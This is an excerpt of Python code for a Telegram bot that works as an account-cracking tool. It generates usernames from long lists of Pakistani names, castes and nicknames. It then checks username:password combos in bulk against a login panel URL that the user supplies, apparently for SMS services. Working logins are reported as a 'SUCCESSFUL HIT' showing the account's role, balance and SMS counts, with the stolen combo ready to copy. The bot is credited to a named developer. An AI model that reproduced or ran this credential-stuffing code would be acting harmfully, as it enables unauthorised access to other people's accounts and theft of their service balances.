...
BOYS_NAMES = ["ahmed", "ali", "hassan", "hussain", "usman", "omar", "zain", "rayyan", "ayan", "ehsan", "bilal", "danish", "farhan", "haris", "imran", "junaid", "kamran", "luqman", "moeen", "nadeem", "osama", "qasim", "rashid", "salman", "tariq", "waqas", "yasir", "zeeshan", "asif", "abdullah", "tahir", "ahsan", "arslan", "azhar", "umar", "hamza", "faisal", "khalid", "ahmad", "hamid", "saad", "sami", "usama", "bakar", "jawad", "jafar", "jabbar", "ilyas", "ikram", "jamal", "mansoor", "maan", "mohsin", "mazhar", "mujahid", "nahid", "sajid", "sabir", "sultan", "talha", "tamim", "waseem", "afnan", "aftab", "arshad", "asim", "asad", "atif", "awais", "babar", "azlan", "ejaz", "faizan", "gulzar", "haseeb", "irfan", "javed", "muneeb", "owais", "parvez", "raheel", "shahid", "yousaf", "zahid", "akhtar", "bashir", "dilawar", "farooq", "ghulam", "habib", "inam", "jalal", "kashif", "latif", "maqsood", "nasir", "obaid", "pervaiz", "rafiq", "shafiq", "tanveer", "umair", "wajid", "yameen", "zafar", "abid", "dawood", "fazal", "hameed", "iftikhar", "jamil", "karim", "majid", "nazir", "qadeer", "rahman", "saeed", "tufail", "zulfiqar", "akram", "barkat", "dost", "fida", "gohar", "ishaq", "malik", "noor", "qayyum", "riaz", "sher", "taj", "ullah", "wazir", "zaheer", "abrar", "baig", "dar", "gilani", "haider", "iqbal", "jaffar", "lodhi", "mirza", "nawaz", "qazi", "rana", "uzair", "wasim", "yawar", "zaman", "afzal", "bhutta", "durrani", "ghouri", "jahangir", "langah", "nisar", "quraishi", "abbasi", "chughtai", "elahi", "faridi", "hashmi", "kazi", "memon", "pasha", "qadri", "raza", "siddiqui", "usmani", "zaidi", "alvi", "bukhari", "dasti", "jafri", "kazmi", "naqvi", "rizvi", "shirazi", "taqi", "amiri", "dawani", "farman", "gul", "imami", "khattak", "masud", "osmani", "qalandar", "rashidi", "suhail", "waris", "zubair", "aamir", "binyamin", "ghani", "haroon", "jamshaid", "kamil", "mashhood", "naseem", "parwaiz", "qaiser", "rashad", "sajjad", "taimoor", "ubaid", "waleed", "younus", "zulqarnain", "shahbaz", "naveed", "masood", "anwar", "shahzad", "zahoor", "muhammad", "akbar", "shahzaib", "zohaib", "shayan", "zayan", "rehan", "khizar", "ayyan", "sameer", "rauf", "jabir", "nabeel", "shaheer", "rizwan", "faiz", "shafqat", "imtiaz"]
GIRLS_NAMES = ["ayesha", "fatima", "zara", "sana", "iqra", "mahira", "hira", "sara", "maha", "zainab", "maryam", "kiran", "nida", "uzma", "samina", "shazia", "tahira", "naila", "saima", "rabia", "warda", "hina", "amina", "khadija", "nadia", "sehar", "fiza", "hania", "mahnoor", "eman", "aleena", "bisma", "fariha", "haleema", "iman", "javeria", "kainat", "laila", "misha", "rimsha", "sadia", "wajiha", "yasmeen", "afia", "bushra", "farah", "ghazala", "humaira", "jannat", "laiba", "mehwish", "najma", "parveen", "rashida", "shabnam", "tasneem", "yumna", "zakia", "aalia", "hafsa", "iffat", "kalsoom", "lubna", "maimoona", "noreen", "qudsia", "ruqayya", "safia", "tayyaba", "wafa", "zahra", "afsheen", "bilquis", "chaman", "dilshad", "falak", "gulnaz", "husna", "ishrat", "jameela", "kishwar", "mahnaz", "amna", "anum", "dania", "esha", "fariya", "gulshan", "isra", "kulsoom", "mehak", "omeira", "pakeeza", "qurat", "tania", "umaima", "varda", "xara", "barira", "dure", "gulalai", "pari", "ummi", "yakoot", "chanda", "durriya", "nargis"]
CAST_NAMES = ["rajput", "minhas", "bhatti", "chauhan", "parihar", "tomar", "katoch", "dogra", "jamwal", "jutt", "sial", "sandhu", "gill", "dhillon", "sidhu", "bajwa", "cheema", "waraich", "maan", "arain", "sindhi", "bhutto", "soomro", "talpur", "mangrio", "memon", "khosa", "sardar", "khan", "nawab", "baloch", "bugti", "marri", "mengal", "kakar", "pashtun", "afridi", "ghilzai", "yousafzai", "gujjar", "awak", "kamboh", "khokhar", "sheikh", "syed", "ansari", "awan", "butt", "khawaja", "jadoon", "tarar", "gakhar", "qureshi", "mughal"]
NICKNAMES = ["prince", "boss", "hacker", "killer", "lover", "jani", "babu", "shona", "pappu", "gugu", "chota", "bada", "rockstar", "romeo", "sweetie", "cutie", "doll", "angel", "tiger", "king", "queen", "master", "pro", "noob", "max", "alpha", "legend", "champ"]
...
def generate_unique_usernames(count):
    ...
    while len(pool) < count and attempts < max_attempts:
        ...
        variations = [name + suffix, name.capitalize() + suffix, name + name]
        
        if attempts % 5 == 0:
            variations.append(random.choice(GLOBAL_FIRST) + random.choice(GLOBAL_LAST))
            variations.append(random.choice(COMMON_WORDS) + str(random.randint(1, 99)))
            
        for v in variations:
            if v not in USED_NAMES and v not in pool:
                pool.add(v)
...
async def gennam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id not in user_sessions: 
        user_sessions[user_id] = UserSession(user_id, update.effective_user.first_name)
    session = user_sessions[user_id]
    ...
    keyboard = [
        [btn("✅ YES, START CHECK", "gennam_yes")],
        [btn("❌ NO, CANCEL", "cancel")]
    ]
    
    await msg.edit_text(
        premium_emoji(f"✅ <b>Successfully generated {len(new_combos)} completely NEW names!</b> 💥\n\nYe names bot mein pehle kabhi check nahi hue.\n\n👇 <b>Want to start checking now?</b>"), 
...
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if session.state == "WAITING_PANEL_NAME":
        ...
        await update.message.reply_text(
            premium_emoji(f"🎯 <b>New URL Configured!</b>\n\n👇 <b>Select Account Type to start checking {len(session.custom_names)} generated names:</b>"),
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="HTML"
        )
...
💡 <b>Developer:</b> {admin_link}""")
    ...
    if data == "gennam_yes":
        ...
        await query.edit_message_text(
            premium_emoji("📋 <b>Great! Select a Saved Panel OR provide a New URL:</b>"), 
            reply_markup=InlineKeyboardMarkup(keyboard), 
            parse_mode="HTML"
        )
        return
    ...
    if data == "gennam_new_url":
        ...
        await query.edit_message_text(
            premium_emoji("🔗 <b>Send the New Panel URL:</b>\n\nExample: <code>http://example.com/ints/login</code>"), 
            parse_mode="HTML"
        )
        return
        ...
        for future in as_completed(futures):
            ...
            if result:
                ...
                if session.target_role == "Agent" and role != "Agent":
                    ...
                    combo_str = f"{username}:{password}"
                    
                    live_msg = premium_emoji(f"""
🌟 <b>[ SUCCESSFUL HIT ]</b> 🌟
━━━━━━━━━━━━━━━━━━━━
🎯 <b>Panel:</b> {panel_name}
🔗 <b>Link:</b> <a href="{login_url}">Login Here</a>

📋 <b>Account Details:</b>
├ <b>Role:</b> {role_emoji} {role}
├ <b>Balance:</b> 💰 {stats.get('balance', 0)}
├ <b>Today SMS:</b> 📊 {stats.get('today', 0)}
└ <b>Monthly SMS:</b> 📈 {stats.get('thirty_days', 0)}

🔥 <b>Combo (Tap to Copy):</b>
<code>{combo_str}</code>
━━━━━━━━━━━━━━━━━━━━
💡 <b>Found By:</b> <a href="https://t.me/Asifsakhani786">ASIF SAKHANI</a>""")
                    try:
